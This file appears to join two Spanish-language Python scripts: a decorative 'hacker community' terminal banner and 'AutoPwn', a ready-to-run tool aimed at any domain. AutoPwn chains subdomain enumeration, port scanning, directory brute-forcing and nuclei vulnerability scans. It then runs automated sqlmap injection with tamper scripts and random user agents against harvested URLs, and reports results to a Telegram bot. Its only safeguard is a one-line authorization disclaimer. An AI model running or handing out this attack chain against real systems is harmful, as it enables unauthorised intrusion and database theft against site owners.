#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import sys
import time
import random
import os

# ─── ANSI COLOR CODES ───────────────────────────────────────────────────────
RESET   = "\033[0m"
BOLD    = "\033[1m"
DIM     = "\033[2m"

# Greens (matrix style)
G_DARK  = "\033[38;5;22m"
G_MID   = "\033[38;5;40m"
G_BRIGHT= "\033[38;5;46m"
G_NEON  = "\033[38;5;82m"

# Accents
CYAN    = "\033[38;5;51m"
WHITE   = "\033[38;5;255m"
GRAY    = "\033[38;5;240m"
RED     = "\033[38;5;196m"
YELLOW  = "\033[38;5;226m"

# Background
BG_BLACK= "\033[40m"

# ─── HELPERS ────────────────────────────────────────────────────────────────
def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def typewrite(text, delay=0.018, color=""):
    for ch in text:
        sys.stdout.write(color + ch + RESET)
        sys.stdout.flush()
        time.sleep(delay)
    print()

def glitch_line(text, color=G_BRIGHT, glitch_color=RED, iterations=3, delay=0.07):
    """Simula efecto glitch en una línea."""
    glitch_chars = "!@#$%^&*<>?/|\\[]{}~±§"
    for _ in range(iterations):
        glitched = ""
        for ch in text:
            if ch != ' ' and random.random() < 0.15:
                glitched += random.choice(glitch_chars)
            else:
                glitched += ch
        sys.stdout.write(f"\r{glitch_color}{BOLD}{glitched}{RESET}")
        sys.stdout.flush()
        time.sleep(delay)
    sys.stdout.write(f"\r{color}{BOLD}{text}{RESET}\n")
    sys.stdout.flush()

def random_hex_stream(width=60, lines=3, delay=0.04):
    """Imprime un stream de hex estilo boot."""
    for _ in range(lines):
        row = ""
        for _ in range(width // 3):
            row += f"{random.randint(0,255):02X} "
        color = random.choice([G_DARK, G_MID, G_BRIGHT, GRAY])
        print(f"{color}{DIM}{row}{RESET}")
        time.sleep(delay)

def matrix_rain_line(width=70):
    """Una línea estilo Matrix rain."""
    chars = "ﾊﾐﾋｰｳｼﾅﾓﾆｻﾜﾂｵﾘｱﾎﾃﾏｹﾒｴｶｷﾑﾕﾗｾﾈｽﾀﾇﾍ01アイウエオカキ"
    line = "".join(random.choice(chars) if random.random() > 0.3 else " " for _ in range(width))
    colors = [G_DARK, G_MID, G_BRIGHT, G_NEON]
    out = ""
    for ch in line:
        out += random.choice(colors) + ch
    print(out + RESET)

def separator(char="─", width=70, color=G_MID):
    print(f"{color}{char * width}{RESET}")

def center_text(text, width=70, color=WHITE, bg=""):
    padding = (width - len(text)) // 2
    print(f"{' ' * padding}{bg}{color}{BOLD}{text}{RESET}")

# ─── ASCII ART ───────────────────────────────────────────────────────────────
SKULL = [
    r"    ░░░░░░░░░░░░░░░░░    ",
    r"   ░░  ░░░░░░░░░░  ░░   ",
    r"  ░░  ░░      ░░  ░░  ░░ ",
    r" ░░░░░░        ░░░░░░░░░ ",
    r" ░░ ██  ░░░░  ██  ░░░░░ ",
    r" ░░░░░░  ░░  ░░░░░░░░░░ ",
    r"  ░░░░░░░░░░░░░░░░░░░░  ",
    r"   ░░░ ░░░░░░░ ░░░░░░   ",
    r"    ░░░░░░░░░░░░░░░░     ",
]

HACKING_ART = [
    "  ██╗  ██╗ █████╗  ██████╗██╗  ██╗██╗███╗   ██╗ ██████╗  ",
    "  ██║  ██║██╔══██╗██╔════╝██║ ██╔╝██║████╗  ██║██╔════╝  ",
    "  ███████║███████║██║     █████╔╝ ██║██╔██╗ ██║██║  ███╗ ",
    "  ██╔══██║██╔══██║██║     ██╔═██╗ ██║██║╚██╗██║██║   ██║ ",
    "  ██║  ██║██║  ██║╚██████╗██║  ██╗██║██║ ╚████║╚██████╔╝ ",
    "  ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝ ",
]

TEAM_ART = [
    "        ████████╗███████╗ █████╗ ███╗   ███╗        ",
    "           ██╔══╝██╔════╝██╔══██╗████╗ ████║        ",
    "           ██║   █████╗  ███████║██╔████╔██║        ",
    "           ██║   ██╔══╝  ██╔══██║██║╚██╔╝██║        ",
    "           ██║   ███████╗██║  ██║██║ ╚═╝ ██║        ",
    "           ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝        ",
]

COMUNIDAD_ART = [
    " ██████╗ ██████╗ ███╗   ███╗██╗   ██╗███╗   ██╗██╗██████╗  █████╗ ██████╗ ",
    "██╔════╝██╔═══██╗████╗ ████║██║   ██║████╗  ██║██║██╔══██╗██╔══██╗██╔══██╗",
    "██║     ██║   ██║██╔████╔██║██║   ██║██╔██╗ ██║██║██║  ██║███████║██║  ██║",
    "██║     ██║   ██║██║╚██╔╝██║██║   ██║██║╚██╗██║██║██║  ██║██╔══██║██║  ██║",
    "╚██████╗╚██████╔╝██║ ╚═╝ ██║╚██████╔╝██║ ╚████║██║██████╔╝██║  ██║██████╔╝",
    " ╚═════╝ ╚═════╝ ╚═╝     ╚═╝ ╚═════╝ ╚═╝  ╚═══╝╚═╝╚═════╝ ╚═╝  ╚═╝╚═════╝ ",
]

DE_HACKERS_ART = [
    "     ██████╗ ███████╗    ██╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗██████╗ ███████╗",
    "     ██╔══██╗██╔════╝    ██║  ██║██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗██╔════╝",
    "     ██║  ██║█████╗      ███████║███████║██║     █████╔╝ █████╗  ██████╔╝███████╗",
    "     ██║  ██║██╔══╝      ██╔══██║██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗╚════██║",
    "     ██████╔╝███████╗    ██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██║  ██║███████║",
    "     ╚═════╝ ╚══════╝    ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝",
]

# ─── INFO PANEL ──────────────────────────────────────────────────────────────
INFO_LINES = [
    ("[ SISTEMA ]", f"Linux x86_64 | Python {sys.version.split()[0]}"),
    ("[ STATUS  ]", "OPERATIVO ▶ ONLINE"),
    ("[ NIVEL   ]", "ELITE ████████████ 100%"),
    ("[ RED     ]", "TOR ACTIVO | VPN ACTIVO | ANONIMO"),
    ("[ MISIÓN  ]", "Aprender · Explorar · Compartir"),
]

QUOTES = [
    "\"La información quiere ser libre.\"  — Stewart Brand",
    "\"Hack the planet.\"  — Hackers (1995)",
    "\"Cuestiona todo. Rompe límites. Comparte conocimiento.\"",
    "\"La seguridad no es un producto, es un proceso.\"  — B. Schneier",
]

# ─── MAIN BANNER ─────────────────────────────────────────────────────────────
def show_banner():
    clear()

    # Boot sequence
    print(f"\n{G_MID}{DIM}  [*] Iniciando sistema...{RESET}")
    time.sleep(0.3)
    random_hex_stream(width=66, lines=2, delay=0.03)
    print(f"{G_MID}{DIM}  [*] Cargando módulos...{RESET}")
    time.sleep(0.2)
    random_hex_stream(width=66, lines=2, delay=0.03)
    print(f"{G_NEON}{BOLD}  [✓] Sistema listo.{RESET}\n")
    time.sleep(0.3)

    # Matrix rain header
    for _ in range(4):
        matrix_rain_line(72)
        time.sleep(0.04)

    print()
    separator("═", 72, G_NEON)
    separator(" ", 72)

    # HACKING
    for i, line in enumerate(HACKING_ART):
        colors = [G_DARK, G_MID, G_BRIGHT, G_NEON, G_BRIGHT, G_MID]
        glitch = (i == 0)
        if glitch:
            glitch_line(line, color=G_NEON, glitch_color=RED, iterations=2, delay=0.05)
        else:
            print(f"{colors[i % len(colors)]}{BOLD}{line}{RESET}")
        time.sleep(0.05)

    # TEAM
    print()
    for i, line in enumerate(TEAM_ART):
        colors = [G_MID, G_BRIGHT, G_NEON, G_BRIGHT, G_MID, G_DARK]
        print(f"{colors[i % len(colors)]}{BOLD}{line}{RESET}")
        time.sleep(0.04)

    separator(" ", 72)
    separator("─", 72, G_MID)
    separator(" ", 72)

    # COMUNIDAD
    for i, line in enumerate(COMUNIDAD_ART):
        shade = [G_DARK, G_MID, G_BRIGHT, G_BRIGHT, G_MID, G_DARK]
        print(f"{shade[i % len(shade)]}{BOLD}{line}{RESET}")
        time.sleep(0.04)

    print()

    # DE HACKERS
    for i, line in enumerate(DE_HACKERS_ART):
        shade = [G_MID, G_BRIGHT, G_NEON, G_NEON, G_BRIGHT, G_MID]
        print(f"{shade[i % len(shade)]}{BOLD}{line}{RESET}")
        time.sleep(0.04)

    separator(" ", 72)
    separator("═", 72, G_NEON)

    # Matrix rain footer
    print()
    for _ in range(3):
        matrix_rain_line(72)
        time.sleep(0.04)

    # Info panel
    print()
    separator("┌" + "─"*70 + "┐", 1, G_MID)
    for label, value in INFO_LINES:
        pad = 70 - len(label) - len(value) - 4
        print(f"{G_MID}│ {CYAN}{BOLD}{label}{RESET}  {G_BRIGHT}{value}{' ' * pad}{G_MID}│{RESET}")
    separator("└" + "─"*70 + "┘", 1, G_MID)

    # Quote
    print()
    quote = random.choice(QUOTES)
    center_text(quote, 72, YELLOW)
    print()

    # Skull decorativo pequeño
    for line in SKULL:
        center_text(line, 72, G_MID)

    print()
    separator("═", 72, G_NEON)
    center_text("[ ACCESO AUTORIZADO — BIENVENIDO, HACKER ]", 72, G_NEON)
    separator("═", 72, G_NEON)

    # Prompt final animado
    print()
    typewrite("  root@hackteam:~$ ", delay=0.07, color=G_BRIGHT)
    time.sleep(0.3)
    typewrite("  Cargando entorno...", delay=0.04, color=G_MID)
    time.sleep(0.2)
    typewrite(f"  [✓] Bienvenido a la Comunidad de Hackers.", delay=0.03, color=G_NEON)
    print()

if __name__ == "__main__":
    try:
        show_banner()
    except KeyboardInterrupt:
        print(f"\n{RED}[!] Banner interrumpido.{RESET}\n")
# ╔═══════════════════════════════════════════════════════════════╗
# ║          AutoPwn v1.0 - Full Recon & Exploitation            ║
# ║     assetfinder · subfinder · amass · dnsx · httpx           ║
# ║     gau · waybackurls · katana · hakrawler · ffuf            ║
# ║     naabu · nuclei · gobuster · sqlmap                       ║
# ╚═══════════════════════════════════════════════════════════════╝

import subprocess
import os
import sys
import argparse
import datetime
import requests
import json
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor

# ─── COLORES ────────────────────────────────────────────────────
R  = "\033[0;31m"
G  = "\033[0;32m"
Y  = "\033[1;33m"
B  = "\033[1;34m"
C  = "\033[1;36m"
M  = "\033[1;35m"
W  = "\033[0m"
BO = "\033[01;01m"

# ─── TELEGRAM ───────────────────────────────────────────────────
TELEGRAM_TOKEN   = "telegramtoken"
TELEGRAM_CHAT_ID = "idgrouptelegram"

# ─── TOOLS PATH ─────────────────────────────────────────────────
GO_TOOLS = os.path.expanduser("~/go")

def find_tool(name):
    """Busca el binario en ~/go/, ~/go/bin/ y en el PATH del sistema."""
    candidates = [
        os.path.expanduser(f"~/go/{name}"),
        os.path.expanduser(f"~/go/bin/{name}"),
        f"{GO_TOOLS}/{name}",
        f"{GO_TOOLS}/bin/{name}",
    ]
    for c in candidates:
        if os.path.isfile(c) and os.access(c, os.X_OK):
            return c
    # fallback: which
    try:
        which = subprocess.run(["which", name], capture_output=True, text=True).stdout.strip()
        if which:
            return which
    except Exception:
        pass
    return name  # último recurso: confiar en el PATH

TOOL_NAMES = ["amass","anew","dnsx","ffuf","gau","gobuster",
              "hakrawler","httpx","katana","naabu","nuclei",
              "subfinder","waybackurls","sqlmap","nmap"]
TOOLS = {n: find_tool(n) for n in TOOL_NAMES}

def banner():
    print(f"""{BO}{M}
  ██████╗ ██╗   ██╗████████╗ ██████╗ ██████╗ ██╗    ██╗███╗   ██╗
 ██╔══██╗██║   ██║╚══██╔══╝██╔═══██╗██╔══██╗██║    ██║████╗  ██║
 ███████║██║   ██║   ██║   ██║   ██║██████╔╝██║ █╗ ██║██╔██╗ ██║
 ██╔══██║██║   ██║   ██║   ██║   ██║██╔═══╝ ██║███╗██║██║╚██╗██║
 ██║  ██║╚██████╔╝   ██║   ╚██████╔╝██║     ╚███╔███╔╝██║ ╚████║
 ╚═╝  ╚═╝ ╚═════╝    ╚═╝    ╚═════╝ ╚═╝      ╚══╝╚══╝ ╚═╝  ╚═══╝
{W}
 {C}[ Full Recon + Exploitation Framework By AnonSec777 ]{W}
 {Y}[!] Úsalo solo en sistemas con autorización{W}
""")

# ─── HELPERS ────────────────────────────────────────────────────
def log(msg, color=G, tag="+"): print(f"{color}[{tag}] {msg}{W}")
def info(msg):  log(msg, C, "*")
def warn(msg):  log(msg, Y, "!")
def error(msg): log(msg, R, "✗")
def done(msg):  log(msg, G, "✓")

def tg_notify(msg):
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
        requests.post(url, data={
            "chat_id": TELEGRAM_CHAT_ID,
            "text": msg,
            "parse_mode": "Markdown"
        }, timeout=10)
    except Exception:
        pass

def run(cmd, output_file=None, shell=False):
    """Ejecuta un comando y opcionalmente guarda la salida."""
    try:
        result = subprocess.run(
            cmd if shell else cmd.split(),
            capture_output=True, text=True, timeout=600
        )
        out = result.stdout.strip()
        if output_file and out:
            Path(output_file).write_text(out)
        return out
    except subprocess.TimeoutExpired:
        warn(f"Timeout: {cmd[:60]}...")
        return ""
    except Exception as e:
        warn(f"Error ejecutando: {cmd[:60]} → {e}")
        return ""

def run_pipe(cmd1, cmd2, output_file=None):
    """Ejecuta dos comandos en pipe."""
    try:
        p1 = subprocess.Popen(cmd1.split(), stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)
        p2 = subprocess.Popen(cmd2.split(), stdin=p1.stdout, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)
        p1.stdout.close()
        out, _ = p2.communicate(timeout=600)
        out = out.decode().strip()
        if output_file and out:
            Path(output_file).write_text(out)
        return out
    except Exception as e:
        warn(f"Pipe error: {e}")
        return ""

def count_lines(filepath):
    try:
        return sum(1 for _ in open(filepath))
    except:
        return 0

def file_exists_nonempty(filepath):
    p = Path(filepath)
    return p.exists() and p.stat().st_size > 0

def tool_path(name):
    return TOOLS.get(name, name)

# ─── FASES ──────────────────────────────────────────────────────

def phase_subdomain_enum(target, out):
    info("FASE 1 — Enumeración de subdominios")
    subs_file = f"{out}/subs.txt"

    # subfinder
    info("Subfinder...")
    run_pipe(f"echo {target}", f"{tool_path('subfinder')} -silent", f"{out}/subfinder.txt")

    # amass
    info("Amass (pasivo)...")
    run(f"{tool_path('amass')} enum -passive -d {target} -o {out}/amass.txt")

    # Combinar y deduplicar
    all_subs = set()
    for f in [f"{out}/subfinder.txt", f"{out}/amass.txt"]:
        if file_exists_nonempty(f):
            all_subs.update(open(f).read().splitlines())

    if all_subs:
        Path(subs_file).write_text("\n".join(sorted(all_subs)))
        done(f"Subdominios únicos: {len(all_subs)}")
        tg_notify(f"📡 *Subdominios*\n🎯 `{target}`\n🔢 Total: {len(all_subs)}")
    else:
        warn("No se encontraron subdominios")

    return subs_file

def phase_dns_resolution(out):
    info("FASE 2 — Resolución DNS con dnsx")
    subs_file = f"{out}/subs.txt"
    live_dns  = f"{out}/live_dns.txt"

    if not file_exists_nonempty(subs_file):
        warn("Sin subdominios para resolver")
        return live_dns

    run(f"{tool_path('dnsx')} -l {subs_file} -silent -o {live_dns}")
    done(f"Hosts resueltos: {count_lines(live_dns)}")
    return live_dns

def phase_port_scan(out, live_dns):
    info("FASE 3 — Escaneo de puertos con naabu")
    ports_file = f"{out}/ports.txt"

    if not file_exists_nonempty(live_dns):
        warn("Sin hosts para escanear puertos")
        return ports_file

    run(f"{tool_path('naabu')} -l {live_dns} -silent -o {ports_file}")
    done(f"Puertos abiertos: {count_lines(ports_file)}")
    tg_notify(f"🔍 *Puertos abiertos*\n🔢 {count_lines(ports_file)} resultados")
    return ports_file

def phase_http_probe(out, subs_file):
    info("FASE 4 — Detección de hosts HTTP con httpx")
    live_file = f"{out}/live.txt"

    if not file_exists_nonempty(subs_file):
        warn("Sin subdominios para httpx")
        return live_file

    run(f"{tool_path('httpx')} -l {subs_file} -silent -o {live_file} -threads 50")
    done(f"Hosts HTTP activos: {count_lines(live_file)}")
    tg_notify(f"🟢 *HTTP Activos*\n🖥️ {count_lines(live_file)} hosts")
    return live_file

def phase_url_collection(target, out, live_file):
    info("FASE 5 — Recolección masiva de URLs")
    urls_file = f"{out}/urls.txt"
    all_urls  = set()

    # gau
    info("GAU...")
    r = run(f"{tool_path('gau')} {target}")
    if r: all_urls.update(r.splitlines())

    # waybackurls
    info("Waybackurls...")
    r = run_pipe(f"echo {target}", tool_path("waybackurls"))
    if r: all_urls.update(r.splitlines())

    # katana
    if file_exists_nonempty(live_file):
        info("Katana (crawl)...")
        r = run(f"{tool_path('katana')} -list {live_file} -silent -depth 3")
        if r: all_urls.update(r.splitlines())

    # hakrawler
    if file_exists_nonempty(live_file):
        info("Hakrawler...")
        try:
            p1 = subprocess.Popen(["cat", live_file], stdout=subprocess.PIPE)
            p2 = subprocess.Popen([tool_path("hakrawler")], stdin=p1.stdout,
                                   stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)
            p1.stdout.close()
            out_h, _ = p2.communicate(timeout=300)
            all_urls.update(out_h.decode().strip().splitlines())
        except Exception as e:
            warn(f"Hakrawler: {e}")

    if all_urls:
        Path(urls_file).write_text("\n".join(sorted(all_urls)))
        done(f"URLs únicas recolectadas: {len(all_urls)}")
        tg_notify(f"🌐 *URLs Recolectadas*\n🔗 {len(all_urls)} URLs únicas")

    return urls_file

def phase_directory_bruteforce(out, live_file):
    info("FASE 6 — Fuerza bruta de directorios con ffuf + gobuster")
    dir_out = f"{out}/dirs"
    os.makedirs(dir_out, exist_ok=True)

    wordlist = "/usr/share/wordlists/dirb/common.txt"
    if not Path(wordlist).exists():
        warn(f"Wordlist no encontrada: {wordlist}")
        return

    if not file_exists_nonempty(live_file):
        warn("Sin hosts para fuerza bruta")
        return

    hosts = open(live_file).read().splitlines()[:10]  # Limitar a 10 hosts

    for host in hosts:
        safe = host.replace("https://", "").replace("http://", "").replace("/", "_")
        info(f"ffuf → {host}")
        run(f"{tool_path('ffuf')} -u {host}/FUZZ -w {wordlist} -mc 200,301,302,403 "
            f"-o {dir_out}/{safe}_ffuf.json -of json -silent")

    done("Directory brute-force completado")

def phase_vuln_scan(out, live_file):
    info("FASE 7 — Escaneo de vulnerabilidades con nuclei")
    nuclei_file = f"{out}/nuclei.txt"

    if not file_exists_nonempty(live_file):
        warn("Sin hosts para nuclei")
        return nuclei_file

    # Detectar versión de nuclei para usar flags correctas
    ver_out = run(f"{tool_path('nuclei')} -version")
    is_v3 = "v3" in ver_out or "3." in ver_out

    if is_v3:
        # nuclei v3: -s en lugar de -severity, -no-color en lugar de -nc
        nuclei_cmd = (
            f"{tool_path('nuclei')} -l {live_file} "
            f"-s critical,high,medium "
            f"-silent -no-color "
            f"-o {nuclei_file} "
            f"-stats -timeout 10 "
            f"-retries 2"
        )
    else:
        # nuclei v2
        nuclei_cmd = (
            f"{tool_path('nuclei')} -l {live_file} "
            f"-severity critical,high,medium "
            f"-silent -nc "
            f"-o {nuclei_file} "
            f"-timeout 10 "
            f"-retries 2"
        )

    run(nuclei_cmd)

    count = count_lines(nuclei_file)
    done(f"Nuclei findings: {count}")
    if count > 0:
        tg_notify(f"⚠️ *Nuclei Findings*\n🔴 {count} vulnerabilidades (critical/high/med)")

    return nuclei_file

def phase_sqlmap(out, urls_file, target):
    info("FASE 8 — SQL Injection con sqlmap")
    sql_out  = f"{out}/sqlmap"
    sql_file = f"{out}/sqli_found.txt"
    os.makedirs(sql_out, exist_ok=True)

    if not file_exists_nonempty(urls_file):
        warn("Sin URLs para sqlmap")
        return

    # Filtrar URLs con parámetros
    all_urls = open(urls_file).read().splitlines()
    param_urls = [u for u in all_urls if "?" in u and "=" in u]

    if not param_urls:
        warn("No se encontraron URLs con parámetros para SQLi")
        return

    done(f"URLs con parámetros: {len(param_urls)}")

    # Guardar urls con parámetros
    params_file = f"{out}/param_urls.txt"
    Path(params_file).write_text("\n".join(param_urls[:200]))  # max 200

    info(f"Ejecutando sqlmap en {min(len(param_urls), 200)} URLs...")

    cmd = (
        f"sqlmap -m {params_file} "
        f"--batch --level=3 --risk=2 "
        f"--dbs --forms "
        f"--output-dir={sql_out} "
        f"--results-file={sql_file} "
        f"--threads=5 "
        f"--timeout=10 "
        f"--retries=1 "
        f"--random-agent "
        f"--tamper=space2comment "
        f"--smart"
    )

    info("sqlmap corriendo (puede tardar varios minutos)...")
    result = run(cmd)

    if file_exists_nonempty(sql_file):
        count = count_lines(sql_file)
        done(f"SQLi encontradas: {count}")
        tg_notify(f"💉 *SQL Injection*\n🎯 `{target}`\n🔓 {count} vulnerabilidades encontradas\n📁 Resultados en: {sql_out}")
    else:
        warn("sqlmap no encontró vulnerabilidades SQLi (o no terminó)")

def generate_report(target, out, start_time):
    info("Generando reporte final...")

    end_time = datetime.datetime.now()
    duration = str(end_time - start_time).split(".")[0]

    lines = [
        "═" * 60,
        f"  AUTOPWN REPORT — {target}",
        "═" * 60,
        f"  Inicio:   {start_time.strftime('%Y-%m-%d %H:%M:%S')}",
        f"  Fin:      {end_time.strftime('%Y-%m-%d %H:%M:%S')}",
        f"  Duración: {duration}",
        "─" * 60,
    ]

    files = {
        "subs.txt":           "Subdominios",
        "live_dns.txt":       "DNS resueltos",
        "live.txt":           "HTTP activos",
        "ports.txt":          "Puertos abiertos",
        "urls.txt":           "URLs recolectadas",
        "param_urls.txt":     "URLs con parámetros",
        "nuclei.txt":         "Nuclei findings",
        "sqli_found.txt":     "SQLi encontradas",
    }

    for fname, label in files.items():
        fpath = f"{out}/{fname}"
        count = count_lines(fpath) if file_exists_nonempty(fpath) else 0
        lines.append(f"  {label:<25} {count:>6} resultados → {fname}")

    lines += ["═" * 60, f"  Output: {out}", "═" * 60]

    report = "\n".join(lines)
    Path(f"{out}/REPORT.txt").write_text(report)
    print(f"\n{G}{report}{W}\n")

    tg_notify(
        f"✅ *AutoPwn Completado*\n"
        f"🎯 Target: `{target}`\n"
        f"⏱️ Duración: {duration}\n"
        f"📋 Subdominios: {count_lines(f'{out}/subs.txt')}\n"
        f"🟢 HTTP activos: {count_lines(f'{out}/live.txt')}\n"
        f"⚠️ Nuclei: {count_lines(f'{out}/nuclei.txt')}\n"
        f"💉 SQLi: {count_lines(f'{out}/sqli_found.txt')}"
    )

# ─── MAIN ────────────────────────────────────────────────────────
def main():
    banner()

    parser = argparse.ArgumentParser(
        description="AutoPwn - Full recon & exploitation",
        formatter_class=argparse.RawTextHelpFormatter
    )
    parser.add_argument("-t", "--target",   required=True, help="Target: dominio o IP")
    parser.add_argument("-o", "--output",   help="Carpeta de salida (default: autopwn-<target>-<date>)")
    parser.add_argument("--no-ports",       action="store_true", help="Saltar escaneo de puertos")
    parser.add_argument("--no-dirs",        action="store_true", help="Saltar fuerza bruta de directorios")
    parser.add_argument("--no-nuclei",      action="store_true", help="Saltar nuclei")
    parser.add_argument("--no-sqlmap",      action="store_true", help="Saltar sqlmap")
    parser.add_argument("--no-telegram",    action="store_true", help="Deshabilitar notificaciones Telegram")

    args = parser.parse_args()

    # Limpiar http:// y https:// del target
    raw_target = args.target.strip().rstrip("/")
    target = raw_target.replace("https://", "").replace("http://", "").split("/")[0]

    ts  = datetime.datetime.now().strftime("%Y%m%d-%H%M%S")
    out = args.output or f"autopwn-{target}-{ts}"
    Path(out).mkdir(parents=True, exist_ok=True)

    if args.no_telegram:
        global TELEGRAM_TOKEN
        TELEGRAM_TOKEN = ""

    start_time = datetime.datetime.now()

    print(f"{C}[*] Target:  {target}{W}")
    print(f"{C}[*] Output:  {out}{W}")

    # Diagnóstico de herramientas
    print(f"\n{Y}[*] Verificando herramientas...{W}")
    missing = []
    for name in TOOL_NAMES:
        path = TOOLS[name]
        exists = os.path.isfile(path) and os.access(path, os.X_OK)
        status = f"{G}✓{W}" if exists else f"{R}✗{W}"
        print(f"  {status} {name:<15} → {path}")
        if not exists:
            missing.append(name)
    if missing:
        print(f"\n{Y}[!] Herramientas no encontradas: {', '.join(missing)}{W}")
        print(f"{Y}[!] Se saltarán las fases que las requieran{W}")
    print()

    tg_notify(f"🚀 *AutoPwn Iniciado*\n🎯 Target: `{target}`\n⏰ {start_time.strftime('%Y-%m-%d %H:%M:%S')}")

    # ── Fases ────────────────────────────────────────────────────
    subs_file = phase_subdomain_enum(target, out)
    live_dns  = phase_dns_resolution(out)

    if not args.no_ports:
        phase_port_scan(out, live_dns)

    live_file = phase_http_probe(out, subs_file)
    urls_file = phase_url_collection(target, out, live_file)

    if not args.no_dirs:
        phase_directory_bruteforce(out, live_file)

    if not args.no_nuclei:
        phase_vuln_scan(out, live_file)

    if not args.no_sqlmap:
        phase_sqlmap(out, urls_file, target)

    generate_report(target, out, start_time)


if __name__ == "__main__":
    main()
